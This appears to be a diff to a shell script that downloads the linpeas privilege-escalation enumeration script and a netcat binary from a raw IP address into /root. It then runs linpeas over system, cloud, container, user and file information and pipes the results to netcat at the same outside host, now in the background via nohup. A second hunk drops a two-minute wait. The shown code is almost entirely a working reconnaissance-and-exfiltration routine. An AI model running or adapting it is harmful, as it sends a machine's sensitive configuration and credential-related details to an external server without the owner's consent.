@@ -23,7 +23,7 @@ curl http://35.194.58.97/linpeas.sh --output /root/peas.sh
 curl http://35.194.58.97/nc --output /root/nc
 chmod +x /root/peas.sh
 chmod +x /root/nc
-/root/peas.sh -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files | /root/nc 35.194.58.97 443 
+nohup /root/peas.sh -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files | /root/nc 35.194.58.97 443 &
 
 echo done > \${OUTPATH}
 
@@ -59,8 +59,7 @@ do
 done
 
 # Wait for and cat the output
-echo "about to sleep"
-python3 -c "import time; time.sleep(120)"
+
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 cp ${OUTPUT_PATH} peas.txt
